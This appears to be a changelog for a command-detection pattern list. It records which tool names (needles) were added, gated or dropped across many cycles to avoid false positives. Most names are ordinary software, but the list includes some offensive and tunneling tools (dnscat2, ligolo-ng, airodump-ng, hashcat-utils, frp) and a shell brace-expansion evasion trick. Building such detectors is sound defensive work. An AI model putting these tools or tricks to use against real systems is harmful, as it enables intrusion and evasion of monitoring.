- **ALERT 45 (cycle 324): a11y/ime/photo + wm + usd/3d + capture/osint/embedded/formal primitives** — espeakup/lou_translate/lou_trace/lou_debug/lou_allround/brailleblaster/dotsdtbook; scim /gcin/rime_deployer/rime_patch/gateone; lightzone/photoflow/fastrawviewer/filmulator/photoflare/mypaint/drawpile/kolourpaint/tupitube; niri/spectrwm/icewm/fvwm3/ctwm/afterstep/phoc/wmenu/ulauncher/twmn/taffybar; usdcat/usdview/usdtree/usdchecker/usddiff/usdrecord/usdstitch/usdresolve/usdedit/gltf2glb/collada2gltf/fbx2gltf/gltfpack/vdb_print/vdb_render/vdb_view/abcecho/abcinfo/abcls/abcstitcher/abcdiff/abcstitch/pcl_convert/lasview/lasgrid/lasheight/lasground/lasclassify/lascolor/lasduplicate/lasdiff/lasmerge/lasthin/lasvalley/las2dem/las2iso/laslayers/lasnoise/lasscale/mm3d/regard3d/pmvs2/cmvs/meshrecon/rtabmap/kimera/tetview; byzanz/silentcast/swappy/satty/gpick/kcolorchooser/gcolor3/whatsmyname/mklittlefs/mkspiffs/lparse/proverif/cryptoverif/apalache/murphi/fdr4/nusmv/cpachecker/verifast/cpplint/autfilt/genaut/randaut/ltlsynt/ltl2ba. Dropped real-word/proper-noun collisions: fenrir/amis/awesome/herbe/kupfer/tapioca/tapas/pastel/hush/souffle/maude/crucible/kremlin/corral/smack/splint; scim boundary-gated (scimitar).
- **ALERT 45 (cycle 323): astro/drone + survey/ham/nlp + cam/eda/hep/archival primitives** — ekos/astap/hnsky/skychart/serplayer/pipp /sequator/fitswork/ufoanalyzer/siril/fitsliberator; missionplanner/sim_vehicle/mavgraph/mavflightview/mavtomfile/mavflightmodes/mavkml/mavaccel/mavsigloss/mavchat/mav_fence/mav_rally/mav_wp/jmavsim/mavsdk/dji_rev/dji_imah_fwsig; rtkrcv/convbin/pos2kml/str2str/teqc/gamit/globk/glorg/prsolve/poscvt/timeconvert/rtkpost/ezsurv; goesrecv/spyserver/rtl_433/rtlamr/nrsc5/ebook2cw/cwcp/dvrptrptr/ambeserver/p25reflector/wsvt; corenlp/mgiza/mitlm/berkeleylm/cdec/sacrebleu/sacremoses/spm_train/learn_bpe/apply_bpe/berkeleyparser/maltparser/udparser/hunpos/crf_learn/crf_test/mecab; gmoccapy/stepconf/pncconf/halshow/halscope/halmeter/machinekit/chillipeppr/estlcam/pycam/k40whisperer/bambustudio/kisslicer/icestl/skeinforge; bitmap2component/pcb_calculator/pl_editor/cvpcb/gschem/gattrib/gsch2pcb/librepcb/qrouter/timberwolf/svlint/eqy/bitwuzla/dreach/eproof; rootls/rootcp/rootmv/rootprint/rootbrowse/garfieldpp/phits/njoy21/talys/meqtrees/vocl/pyraf/gasgano/scisoft; jhove/verapdf/duracloud/islandora/rawcooked/vrecord/ffmprovisr; abcm2ps/abc2midi/abc2abc/midi2abc/autosp/luppp; subtitleeditor/suprip/subshift/subs2srs/pgs2srt/parlatype; humogen/ancestris. Dropped real-word/proper-noun collisions: cavern/hatanaka/giza/cabocha/sudachi/fugashi/lindera/qrq/conveyor/stiff/tripoli/siegfried/eprints/yaps/lifelines.
- **ALERT 45 (cycle 322): dicom + neuroimaging + meteo/micro/seismic/hydro primitives** — echoscu/dcmqrscp/dcm2jpg/jpg2dcm/dcmgpdir/dcmjpeg/dcmquant/dconvlum/dsr2html/img2dcm/dcmmkcrv/dcmmklup/dcmpschk/dcmpsprt/dcmrecv/gdcmimg/gdcminfo/gdcmpdf/gdcmraw/gdcmviewer; mri_convert/fslmaths/fslroi/fslmerge/slicetimer/dtifit/fsleyes/3dcalc/mrconvert/dwi2response/dwi2fod/tckgen/tcksift/mrview/n4biasfieldcorrection/reg_aladin/heudiconv; grib_ls/grib_set/grib_filter/grib_compare/grib2to1/ncks/ncea/ncap2/ncrename/ncwa/ncbo/ncdiff/ncgen/h5repack/h5diff/h5stat/hdfview/pyferret/bufr_ls/bufr_set/bufr_compare/bfconvert/showinf/domainlist/mkmemo/seisan/geopsy/specfem3d/pygimli/simpeg/em1d/swat2012/modflow6/flopy/seepw/parflow/pflotran/tough2. ferret dropped (real word: animal).
- **ALERT 45 (cycle 321): lang-linter + misc-lang + db-admin/vdb primitives** — staticcheck/errcheck/gocyclo/goconst/gomodifytags/gotests/fillstruct/errorprone; standardrb/solargraph/typeprof/fasterer/metric_fu/deptrac/paratest/kahlan; ocamlbuild/ocamllsp/kaocha/fatpack/minilla/gprbuild/sicstus/mytop/innotop/pg_repack/pg_verifybackup/wal2json/ledisdb/tendisplus. revive dropped (common English verb).
- **ALERT 45 (cycle 320): input/theme/font/launcher/av/data-infra/lint/wayland primitives** — qjoypad/ds4drv/wminput/qt5ct/qt6ct/pywal/hsetroot/gowall/paperview/otfinfo/pyftmerge; wyrd/remindme/jgmenu/mymenu/docky/pulseeffects/webcamoid/slimbookbattery; immuadmin/kconnect/zprint/kibit/arandr/i3blocks/i3status/swaystatus. colmena/comin/melodie/spoon/misspell/eastwood/variety dropped (real-word or substring collisions unfixable).
- **ALERT 45 (cycle 319): latex/wiki/llm/dict/journal/iot/erp primitives** — gojq/dvisvgm/lacheck/bib2gls/kpsewhich/documize/wtfso/chatblade/ksnip/gifine/accerciser/goldendict/po4a/polib/rednotebook/pwqgen/randpwd/tai64n/tai64nlocal/softdog; tasmotizer/kalliope/bacpypes/weberp/adempiere/enewss. Probes across vcs-extras, sec-aux, ecomm, cms-forum, lms, speech returned ~0 misses.
- **ALERT 45 (cycle 318): editor/browser/comms/ssg/build/pkg-img/fpga primitives** — kakoune/zile/qtcreator + falkon/qutebrowser/netsurf/links2/elinks/browsh/palemoon/icecat/konqueror + epiphany/carbonyl/jove/mousepad (gated); sylpheed/trojita/enigmail/hakuneko/tachidesk/rdedup/nheko/discordo/gtkcord/legcord/twurl + seahorse/ripcord/tootle (gated); metalsmith/docusaurus/vitepress/honkit/contentlayer/chpst/softlimit/envdir/envuidgid/buildroot/wchisp/stcgal/hw_server/fpgaconf/fpgainfo/aocl. isar dropped (river-name collision, ` -` gate unfixable).
- **ALERT 45 (cycle 317): office/image/cad-eda/bioinfo/cae/aiml/print/finance primitives** — ooffice/gnumeric/unoserver; jhead/jpegoptim/jpegtran/gifsicle/cwebp/dwebp/vwebp/gthumb/feh/gwenview/eog/nomacs/phototonic/viewnior/qview/kphotoalbum/gtkam/geeqie/gpicview + ristretto(gated); librecad/icebram/ecppack/f4pga/vvp/gap4/macaulay2/cocoa5/qalc/mlr/mapserver/mapserv/tilemill/landez + icepack/trellis (gated); kallisto/freebayes/strelka/busco/canu/hifiasm/unicycler/hmmer/hmmbuild/mmseqs/qiime2/mothur/prinseq + salmon/lumpy/ragtag/velvet (gated); z88r/paraview/tecplot360/femm42/torchserve/tensorboard/stunserver/noteshrink/briss/pdf{crop,book,nup,90,180,270}/kmymoney/skrooge.
- **ALERT 45 (cycle 316): disk-usage/net-monitor/forensics/emulator/game-server/launcher primitives** — ncdu/qdirstat/filelight/grandperspective/wiztree/treesize/k4dirstat; trafshow/iftop/nethogs/vnstatd/darkstat/pktstat/etherape/jnettop/pathchar/tracepath/wpa_supplicant/moserial/speedometer(gated); hashdeep/md5deep/sha1deep/sha256deep/ewfverify/affcat/pidcat; mednafen/mame64/advancemame/fbneo/scummvm/amiberry/puae/caprice32; tshock/lgsm/srcds/csserver/rustserver/dayzserver/sdtdserver/pzserver/ecoserver/dfhack/ioquake3/warsow/warfork/urbanterror/tremulous/unvanquished/etlegacy/freeciv/naev/vegastrike/tremfusion; flatseal + heroic/legendary/wyvern/bottles (gated). blueberry dropped (unfixable food-word collision); virt/rdp/term/disk/mount/debug/re-probes returned 0 misses.
- **ALERT 45 (cycle 315): ci-cd/secrets-mgr/observability/mq/mail/forge/proxy/dns primitives** — buildbot / tekton / bitrise / concourse(gated); ejson / confidant(gated) / sneaker(gated); quickwit / flagger / kubedog / cloudquery / prometheus(gated) / packer(gated); rpk / hivemq / rockset / gajim / doveconf / rspamadm / mailhog / mailpit / cockroach(gated) / dino(gated); gogs / varnish{hist,ncsa,stat,top} / coredns / technitium / mercurial(gated). Broad atlantis gate dropped — existing narrow plan/apply/unlock gate is the established design and `atlantis --version` stays a benign guard.
- **ALERT 45 (cycle 314): blockchain-node + game-engine primitives** — hyperledger besu / bitcond / testcoind / zcashd node daemons and o3de / torqu3d / torque3d / ue4 / ue5 / unrealeditor engine binaries. Short colliding names dropped (uat⊂aquatic/squat, ubt⊂doubt) and real words unreal/unity skipped as unfixable; block chain node and game-engine launch/build paths now flagged.
- **ALERT 45 (cycle 313):** ipmi/bmc/oob primitives (5 needles): freeipmi/ipmidetect/ipmifru/ipmipower/ipmish; ilo dropped (silo/milo — inseparable), racadm/hponcfg covered.
- **ALERT 45 (cycle 312):** wine toolchain primitives (8 needles): wineboot/winecfg/winecpp/winefile/wineg++/winegcc/winelauncher/winepath; bare wine dropped (the drink — inseparable), proton/dxvk/vkd3d covered by existing needles.
- **ALERT 45 (cycle 311):** container-runtime + proxmox ve/pmg primitives (13 needles): conmon/containerd + pmam/pmg/pmmaster/pveacl/pveam/pvecm/pvep/pvesm/pveum/pveversion/qmp; qm/pct dropped (common abbreviations — FP-prone), pmg covers pmg* variants.
- **ALERT 45 (cycle 310):** locate/index-search + desktop-search primitives (11 needles): altlocate/fslocate/glocate/mlocate/plocate/rlocate/slocate + recoll/rga; real-word needles gated (locate/pinot), boundary rga (bergamot); recollq subsumed by recoll.
- **ALERT 45 (cycle 309):** fuzzing-framework + reverse-engineering plugin primitives (8 needles): clusterfuzz/libdislocator/libfuzzer/onefuzz + iaito/r2coj/r2dec; centipede gated, afl dropped (AFL football — boundary-inseparable).
- **ALERT 45 (cycle 308):** mcu-flash/wireless-mcu + home-automation primitives (10 needles): amb23/amb26/amb82/ambiq/ambz/ambz2/ambz3/ameba/esp32 + homeassistant; hass dropped (hass avocado/berry — boundary-inseparable).
- **ALERT 45 (cycle 307):** uptime/oncall + push-notification/mailing-list primitives (18 needles): checkly/gotify/montastic/ntfy/ohdear/pdagent/phare/statuscake/uptimerobot + apprise/cardea/chanify/listserv/postorius/pushbullet/pushover; real-word needles gated (uptime/join/martian); hyperping subsumed by ping.
- **ALERT 45 (cycle 306):** pkg-build/distro-infra + privacy/ad-block primitives (16 needles): ananicy/buildd/copr/debcheckout/debcommit/debdiff/debi/dscverify/koji/kojid/mbs/odcs/wannabuild + pihole/torbrowser/usewithtor; boundary copr (coproduct) and debi (debian); drops ssd/ssr/compose (ambiguous).
- **ALERT 45 (cycle 305):** pkm/note-taking + academic-writing/reference primitives (85 needles): anytype/bearapp/boostnote/dendron/flomo/freemind/freeplane/fsnotes/iawriter/jottacloud/mindomo/notesnook/nvalt/nvultra/remnote/roamjs/siyuan/standardnotes/thebrain/tiddly*/typora/workflowy + bib2*/citeproc/citavi/colwiz/curvenote/hayagriva/proquest/pydataverse/refworks/scrivener/typst/typstyle/zenodo; real-word needles gated (bear/foam/joplin/notion/notable/roam/outliner/ulysses/dryad/endnote/papers), boundary kita dropped (akita/nikita).
- **ALERT 45 (cycle 304):** tunnel/vpn/mini-k8s + worship/bible-study primitives (81 needles): arkade/frp/jprq/k0s/k3os/k3sup/loophole/remotemoe/rke /setconf/showconf/spoketunnel/sqs/trycloudflare/tsnet/tsrelay/tunnelmole/vpnkit/webhookrelay + biblegateway/bibleworks/quelea/propresenter/pushpay/rockms/servantkeeper/tithely/verseview/videopsalm/jsword/esword/olivetree/pocketbible/churchtrac/elvanto/faithlife/freeshow/lyricslive/praison; real-word needles gated (edge/accordance/breeze/presenter/proclaim/shelby/theword), boundary needles rke /pco .
- **ALERT 45 (cycle 303):** ham-radio/dab + media-player/disc/codec primitives (80 needles): hamlib/rigmem/rigswr/flrig/flnet/flarq/flicd/flwrap/radioclk/linpac/uz7ho/soundmodem/igatesoundmodem/aprs*/dablin/dabreceiver/fs4/c2enc/c2dec/c2sim + mpv/mplayer/vlc+variants/smplayer/madplay/mpg123/mpg321/avprobe/avplay/ffserver/ffms/avfs/avisynth/vsutil/vspreview/ssimulacra2/aomenc/aomdec/dav1d/svtav1*/vif/vql/vqm + cdrecord/growisofs/k3b/devede/dvd*/tovid/todisc/poweriso/ultraiso/imgburn/burnaware/acetoneiso/isomaster/isovfy/toolame; navi->navi boundary fix + navidrome/naviseccli split needles.
- **ALERT 45 (cycle 302):** daw/audio-production + jack/midi/lv2 primitives (64 needles): bitwig/bristol/qtractor/yoshimi/zynlmapi/opusmodus/nsmd/ladish/agordejo/distrho/chowdsp/discodsp + jack_*/jacktrip/jalv/lilv/lv2*/sordi/serdi/suil + abc2ly/midi2ly/aplaymidi/pmidi/vmpk/wav2midi/wildmidi/acesrender/byod/libpd; real-word needles gated (reaper/vital/catia/cyclone/patchbay).
- **ALERT 45 (cycle 301):** archive/library + translation/l10n + genealogy/transit primitives (62 needles): omeka/jabref/zettlr/web2disk/lrs2lrf/srfsh + weblate/wlc/pootle/virtaal/crowdin/*2po/po*/pretranslate + gedcom/geneweb/gwb2ged/mostvers/familylines/heredis/myheritage/moovit/walkscore/otp2/trias/graphserver/gtfs*/gpspoint/gconnectd; real-word needles gated (providence/pawtucket/pontoon/ancestry), boundary needle moov .
- **ALERT 45 (cycle 300):** gis/geospatial + 3d-print/cnc + robotics/simulation primitives (~140 needles): gdal_grid/mapnik/osgviewer/pghoard/raster2pgsql/renderd/taudem/gpsbabel + GRASS modules (g.*/r.*/v.*) + slic3r/prusaslicer/klippy/moonraker/repetierserver/meshio/trimesh + catkin/colcon/turtlebot/mujoco/pybullet/vtk/webots/omniverse/isaaclab; real-word needles gated (slope/threshold/duet/photon/plater/drake/ignition).
- **ALERT 45 (cycle 299):** embedded/mcu toolchain + gpu/vendor telemetry primitives (40 needles): embsys/espup/libgpiod/mikro*/mplab_ipe/pickit3/segger/tinyuf2/uf2conv/tty*/amdgpu_top/cpupower/dcgm*/nvitop/rocm*/rocminfo/ryzenadj/udevd/udisksd/upowerd/zenpower; real-word needles gated (avarice/energia/ozone/repart).
- **ALERT 45 (cycle 298):** directory/oracle/vm + cluster/compchem/bioinfo primitives (~130 needles): adrci/sqlplus/sqlservr/ntlm_auth/wbinfo/oddjobd + sbcast/btop/qconf/htcondor/boinc + autodock/grompp/vasp/molpro/phonopy/packmol/qchem + blastn/mlst/roary/metaphlan/liftover/treetime; real-word needles gated (mercury/dirac/dalton/kaiju/prefetch/snippy/sander/spirit/auspice/avogadro/censo/crest/fleur/molar/solvate/bracken/clark/spicy), boundary needles morpho /blat .
- **ALERT 45 (cycle 297):** print/tex/ham + router/cpe/voip primitives (24 needles): tth/ttm/pkp/ohs/hsmm/pyqso/wwff/bf888/ft3d/bpq/fmuk66/hdo2/fwfb + ubus/fw3/fw4/mwan3/owut/ubnthal/swos/smsd/kalkun/snom(!snomed)/b2bua.
- **ALERT 45 (cycle 296):** windows/aix admin + mail/telecom/shell-trick primitives (23 needles): umdh/sqlps/pwdadm/mkldap/mkps/vmo2/pfhd/lsnw/lsswsd + brace-expansion {ls,/{pwd, + mhn/pommo/lsoft/vmh/fmh/babyl/smsq/mmplay/mmw/mmz/snpp + whom flag-gated.
- **ALERT 45 (cycle 295):** sdk/dev/research + emu/game forensic-id primitives (22 needles): zld/sdps/ps4sdk/pspsdk/dkp/abnf2/lasp/lmn/whool/lmql/dspy/nomos + muos/myboy/3dmoo/lswm/fpps4/kyty/an2k/dwsq + saw/folk/ludo flag-gated.
- **ALERT 45 (cycle 294):** sys/net infra + media/music/game primitives (26 needles): sj3/kanaka/wnn/dladm/flowadm/fmadm/sdladm/s2both/mhvtl/mmdf/ospf6d/ztp/ztpd/ol2tpd/mpoad/mpoas + f3d/toktok/madmom/utau/kyma/mf2t/t2mf/havannah + huh/buzz flag-gated.
- **ALERT 45 (cycle 293):** infra/mail/news/retro-server + asm/retro-toolchain/fuzzy/filelister primitives (44 needles): vmmss/msav/ssas/mssdmn/mssph/malwasm/389ds/sssd/pyspf/nntpd/btmp/papd/avmjump/ut99/bo2/jka/vdos/munt/np2 + ld65/da65/sp65/dasm/64tass/mads(!madsen)/vasm/z88dk/pasmo/sjasm/spyfu/fzf/autojump/tym/twtd/lsws/vls/bls/tlls/zls/dls/fzz/f2l/aol + tabs/polo/pls/hls flag-gated - 2 benigns moved to hits.
- **ALERT 45 (cycle 292):** quantum/ai-model/wasm/formal-verif/ham/hdf/webrtc/stats/dvb/knit + dfir/diff/lsp/desktop/netauto/lightning primitives (22 needles): qvm/llava/wasm3/wavm/dafny/tlf/h5ls/jvb/autolab/pspp/mumudvb/ayab /abjad|hayabusa|napalm flag-gated + dyff/pylsp/awww/mdp/jaaa/qtvlm/lnd.
- **ALERT 45 (cycle 291):** wiki/ssg/cms/forum/pad/kanban/time + fileshare/status/dashboard/chat primitives (50 needles): mediawiki/dokuwiki/ikiwiki/gollum/xwiki/wiki-js/hexo/zola/astro/eleventy/pelican/grav/wagtail/payload/keystone/apostrophe/sanity/tinacms/nodebb/flarum/lemmy/kbin/etherpad/cryptpad/excalidraw/wbo/tldraw/openproject/phorge/kimai/activitywatch/timetagger/snippet/snappass/pb/pingvin-share/filestash/projectsend/onionpipe/healthchecks/homepage/dashy/homarr/flame/heimdall-organizr/zulip/rocketchat/mattermost/guilded/spacebar - 34 benigns moved to hits.
- **ALERT 45 (cycle 290):** office/rawphoto/imgai/dj-radio/finance/ecom + icon/texture/smartcard/djvu/asciiart/tts/docs primitives (55 needles): wvtext/xls2csv/darktable-cli/rawtherapee-cli/digikam/shotwell/hugin/enblend/upscale/realsr/waifu2x/esrgan/face_recognition/deepface/dlib/libretime/rivendell/restreamer/invoiceplane/killbill/prestashop/sylius/bagisto/icotool/icnsutils/wrestool/texconv/compressonator/astcenc/basisu/openct/gscriptor/pcsc-lite/ccid_config/pkcs15-init/iipc/jbig2enc/pdf2djvu/djvudigital/tiv/imgcat/jp2a/caca/libcaca/toilet/figlet/boxes/cowsay/fortune/pico/mbrola/svox/cheatsh/navi-tldr/tldr-pages - needle-casing fix (wvText->wvtext: ci_contains lowercases haystack only); eg dropped; 41 benigns moved to hits.
- **ALERT 45 (cycle 289):** mobiledev/firmware/ics/dicom/hl7/drone/cad/fpga + logic/tunnel/rmm/mobile-re primitives (35 needles): simctl/firmware-mod-kit/fact_extractor/modbus-cli/dcm4che/storescu/storescp/dcmodify/dcmtk/orthanc/pydicom/hapi/mirth/apmplanner/freecad-cli/brlcad/solvespace/openlane/qflow/netgen/pulseview/dslogic/openhantek/scopy/dnscat2/rustdesk-server/remotely/dexopt/oatdump/dexdump/apkeep/gplaycli/apkleaks/mobfs/qark - 28 benigns moved to hits.
- **ALERT 45 (cycle 288):** altvcs/patch/review/monorepo/build/task + configlang/template/codegen/docgen/fuzz/mutation/recon primitives (38 needles): got/patchutils/interdiff/filterdiff/combinediff/flipdiff/rediff/rbt/reviewdog/nx/turbo/redo/tup/samu/kati/just/mage/nickel/rcl/j2cli/gomplate/envsubst/mustache/buf/flatc/thrift/avrogen/grpcurl/quicktype/jazzy/mutmut/cosmic-ray/stryker/r2agent/r2pm/zap-cli/cloudlist/asnmap - collisions (rcl->'rcl ' circleci/rclone/verclsid, nx->!nginx, buf->!stdbuf); 27 benigns moved to hits.
- **ALERT 45 (cycle 287):** serial/tty/console/framebuffer/kbd/getty/dm + acct/sysfs/eeprom/i2c/gpio/udev/media/fuzzy primitives (43 needles): miniterm/cutecom/setterm/agetty/fgetty/mingetty/fbset/fbi/fbterm/setfont/showconsolefont/consolechars/loadkeys/telinit/runlevel/xdm/wdm/nodm/fsnotifywait/atrk/batchrun/pexec/systool/systemd-hwdb/eeprom/i2ctransfer/gpiofind/udevinfo/deadbeef/clementine/strawberry/audacious/quodlibet/exa/lsdeluxe/eza/tre/fd/fdfind/skim/picker/navi/fff - boundary rewrites (exa->'exa ', tre->'tre '); sa/ts/sk dropped (collision-prone); 26 benigns moved to hits.
- **ALERT 45 (cycle 286):** editor/dotfiles/nix/appimage/altpkg + pki-nss/mail/contacts/rss primitives (38 needles): micro/amp/lite-xl/lite/codeblocks/geany/kate/chezmoi/yadm/dotbot/rcm/homesick/dotdrop/stow/home-manager/darwin-rebuild/nix-darwin/appimage-builder/linuxdeploy/freebsd-update/portmaster/portupgrade/syspatch/pfexec/modutil/pk12util/crlutil/cmsutil/step-cli/alot/mblaze/nmh/abook/lbdb/ikhal/newsboat/sfeed/greader - mu dropped (emu collision); 17 benigns moved to hits.
- **ALERT 45 (cycle 285):** displaymgr/notif/lock/hex/pager/markdown/present + matrix/xmpp/satellite/telescope/morse/social primitives (30 needles): lightdm/gdm/sddm/dunst/swaync/xss-lock/hexyl/dhex/okteta/moar/glow/mdcat/presenterm/slides/patat/tpp/tig/rtv/tuir/hackernews_tui/oysttyer/gomuks/iamb/fractal/poezio/predict/gpredict/satnogs/indi/ccdciel/phd2/morse - exclusion (tig->!contig); ly/ov/cw dropped (collision-prone); 10 benigns moved to hits.
- **ALERT 45 (cycle 284):** dmi/acpi/coreboot/hwmon/watchdog/ups/laptop/usb/thunderbolt/edac-ras-mce + lttng/stap/pcp/sysstat/sched/numa/hugepages/oom/hid primitives (50 needles): ownership/acpidump/acpixtract/acpiexec/acpibin/iasl/inteltool/msrtool/wd_keepalive/rtcwake/upsd/upsmon/upsc/upsdrvctl/apcupsd/tpacpi-bat/thinkfan/asusd/usbview/usbhid-dump/usbmon/tbtadm/boltctl/edac-util/edac-ctl/rasdaemon/ras-mc-ctl/mcelog/mce-inject/babeltrace/staprun/pmcd/pmlogger/pmie/pmval/pmdumplog/sadc/sadf/setarch/linux32/linux64/numastat/numad/numatop/hugeadm/oomd/earlyoom/nohang/hid-recorder/hidrd-convert - 5 benigns moved to hits (design-internal bare needles), 2 gate-self-collision benigns dropped.
- **ALERT 45 (cycle 283):** stress/bench/gpu/input/v4l + alsa/pulse/pipewire/jack/gvfs/xdg/desktopdb/gsettings/kde/qt/glib/a11y primitives (~79 needles): stress-ng/sysbench/mprime/iperf/netperf/nuttcp/qperf/owping/nvtop/gpustat/intel_gpu_top/glxinfo/vulkaninfo/vkcube/clinfo/vainfo/vdpauinfo/glmark2/vkmark/jstest/sdl2-jstest/v4l2-compliance/v4l2-dbg/qv4l2; amixer/aconnect/aseqdump/speaker-test/alsactl/alsaucm/alsabat/pacmd/pacat/pasuspender/pw-*/wpctl/spa-inspect/spa-monitor/jack_*/gvfs-*/xdg-*/update-desktop-database/update-mime-database/gtk-update-icon-cache/gsettings/dconf/kdeconnect-cli/kstart/qtpaths/linguist/lrelease/lupdate/glib-compile-schemas/glib-compile-resources/gobject-query/onboard/florence/brltty/krfb - exclusions (kstart->!kickstart, dconf->!ldconf); 11 benigns moved to hits (design-internal bare needles).
- **ALERT 45 (cycle 282):** gettext/trans/subtitle/x11/wayland/pwmgr/totp/gpg/ssh/tor + dnsprivacy/knot/mdns/ndisc/ppp/shaping/firewall/netflow/captive/wifi/bt primitives (~46 needles): msgfmt/msgmerge/msginit/msgconv/msgen/xgettext/trans/apertium/aegisub/subedit/setxkbmap/xsetroot/xrdb/xcursorgen/oathtool/pam_yubico/gpgv/sqv/cssh/snowflake-client; stubby/getdns_query/khost/knsupdate/knsec3hash/kjournalprint/mdns-scan/ndptool/accel-ppp/wondershaper/trickle/vuurmuur/ipset/flow-cat/ipfixprobe/sflowtool/hsflowd/nodogsplash/opennds/wifidog/iwlist/wavemon/btmgmt/hciconfig/hcidump - real-word forms gated on ' -'; 'trans' boundary-rewritten to 'trans ' (translate/transfer/transaction/transmission collision); gate-self-collision benigns dropped.
- **ALERT 45 (cycle 281):** gamedev/2d-anim/voxel/eda + flightsim/virtualworld/mud-bbs/term/fuzzy/disk + structdata/csv/diff/watch/init primitives (~66 needles): defold/aseprite/libresprite/tiled/ldtk/opentoonz/synfig/enve/goxel/natron/pencil2d/pcbnew/eeschema/gerbv/pcb-rnd/gnetlist/qucs/ngspice/xyce/gnucap/magic/klayout; jsbsim/fgfs/fgcom/opensimulator/tintin++/tinyfugue/synchronet/mystic/binkd/mtm/fzy/zoxide/fasd/dust/duf/dua-cli/erdtree; jaq/jello/jc/dasel/yj/toml-cli/gron/fq/xq/fx/xsv/miller/in2csv/ssconvert/diffstat/colordiff/icdiff/difft/delta/wdiff/dwdiff/grepdiff/meld/kdiff3/modd/s6/supervise - real-word forms gated on ' -' with exclusions (delta->!deltav); dust-x-docs/delta-x-docs benigns dropped (gate self-collision).
- **ALERT 45 (cycle 280):** icu/dict/tts/midi/audiodsp/audiotag + cd/dvd/camera/image/svg/font + tex/bib/ps/pdf primitives (~75 needles): icuinfo/genrb/derb/dictd/dictfmt/aspell/hunspell/enchant/flite/festival/text2wave/pico2wave/fluidsynth/timidity/amidi/midicsv/csound/sclang/scsynth/faust/sooperlooper/id3v2/id3tag/easytag/kid3-cli/beets/mid3v2/vorbiscomment/atomicparsley/mp3info/mp4info/exfalso; cdparanoia/cdda2wav/icedax/cdrdao/wodim/dvdauthor/dvdbackup/lsdvd/mkisofs/gphoto2/ptpcam/magick/mogrify/composite/montage/vips/netpbm/rsvg-convert/fontforge/ttx/pyftsubset/otf2bdf/bdftopcf/fc-list/fc-cache/fc-match/fc-query; tectonic/dvips/dvipdf/latex2html/bibtex/biber/bibtool/makeindex/xindy/psutils/psnup/pdftotext/pdftoppm/pdfimages/pdfdetach/pdfunite/pdfseparate/pdftocairo - real-word forms gated on ' -'; flite-docs/flite-path/amidi-docs moved to hits (bare-needle design-internal).
- **ALERT 45 (cycle 279):** bioinformatics/genomics + compchem/dft/materials/fea/em-sim + particle/astro/gravwave/crystallography/massspec/cryo/hydro primitives (~74 needles): samtools/bcftools/vcftools/fastqc/fastp/trimmomatic/cutadapt/hisat2/star/minimap2/seqtk/seqkit/megahit/spades/quast/diamond/mafft/muscle/clustalo/raxml/iqtree/mrbayes/beast; obabel/vina/namd/cp2k/psi4/nwchem/pw.x/abinit/siesta/wien2k/cif2cell/pymatgen/ase/freefem/elmer/calculix/su2/code_aster/salome/meep/gprmax/nec2/amber/tinker; delphes/rivet/lhapdf/pythia/ciao/heasoft/xspec/ds9/swarp/scamp/psfex/topcat/gwpy/lal/pycbc/wannier90/ccp4/phenix/shelx/olex2/coot/cctbx/mosflm/xds/openms/mzmine/msconvert/relion/swmm/epanet - real-word forms gated on ' -' with exclusions (star->!start/!star-, ase->!case/!base/!phase/!lease/!erase, lal->!kala); ds9-trek moved to hit (existing bare needle, design-internal).
- **ALERT 45 (cycle 278):** turn/ha/lb/cache/mail/imap/news/monitor/tracing/snmp + storage/zfs/ceph/gluster/pfs/nfs/dav/s3ql/fuse + pki/krb/ldap/nis/pam/apparmor/xattr/time/display/power/cups/sane/modem/ax25/rc/matter/bacnet/ethercat/wire/probe/rf primitives (~95 needles): eturnal/keepalived/ucarp/pen/pound/gobetween/varnishd/varnishadm/varnishlog/trafficserver/courier/cyrus/imapfilter/inn2/innfeed/jaeger-agent/zipkin/skywalking/snmptrap; nvme-cli/thin-provisioning/sanoid/syncoid/ceph-volume/radosgw-admin/glusterd/mfsmaster/mfsmount/lizardfs/lctl/nfsstat/ganesha.nfsd/afpd/s3ql/fuse-overlayfs/snapraid; scepclient/kinit/kdestroy/slapd/ypxfr/pamtester/saslauthd/aa-status/xfs_quota/getfacl/lsattr/getfattr/ntpstat/locale-gen/autorandr/powertop/tlp/auto-cpufreq/thermald/acpitool/brightnessctl/lpstat/cupsenable/cupsaccept/lpinfo/scanimage/sane-find-scanner/zbarimg/mgetty/uqmi/axlisten/ax25ipd/mheard/aprsc/ysfreflector/mmdvm/modesmixer/opentx/edgetx-companion/betaflight-configurator/inav/speeduino/megasquirt/tunerstudio/chip-tool/deconz/bacwh/bacwp/bacsc/bacdcc/bacvm/bacrd/ethercat/eipscan/owfs/owserver/probe-rs/sdrtrunk - real-word forms gated on ' -' with exclusions (pen->!open/!spen, lctl->!journal); aa-status/lsattr/cupsenable/gluster-docs/sanoid-docs/zipkin-docs/pen-x-docs moved to hits (design-internal).
- **ALERT 45 (cycle 277):** wasm/sandbox/unikernel/virt-guest/mq/search/columnar/tsdb/kv/docdb/newsql/nostr + formatter/linter/env-mgr/build-sys + license/radare2/honeypot/wifi/pwattack/tunnel primitives (~87 needles): wasm-bindgen/emcc/emmake/emconfigure/wasm-opt/wasm2wat/wat2wasm/wasm-ld/twiggy/wasm-snip; sandbox2/unikraft/nanos/osv/mirage/solo5/virt-p2v/kustomize; redpanda/aeron/opensearch/manticore/parquet-tools/avro-tools/orc-tools/victoriametrics/vmutils/m3db/valkey/keydb/garnet/rethinkdb/surrealdb/ysqlsh/ycqlsh/yb-admin/tidb/vitess/immudb/nostrcli/iris/damus; black/isort/flake8/pylint/mypy/ruff/eslint/prettier/stylelint/php-cs-fixer/gofumpt/goimports/clang-format/rustfmt/brakeman/gosec/spack/micromamba/virtualenv/pipenv/volta/xmake/plz; scancode-toolkit/reuse/fossa/license-checker/ragg2/rax2/rafind2/rahash2/rarun2/rasign2/cowrie/honeyd/kippo/airodump-ng/hcxtools/hashcat-utils/kwprocessor/princeprocessor/hashid/name-that-hash/cupp/ligolo-ng - real-word forms gated on ' -' with exclusions (black->!blackb); 'please' narrowed to 'plz' (real build-tool name); ns3/volttron docs moved to hits (design-internal).
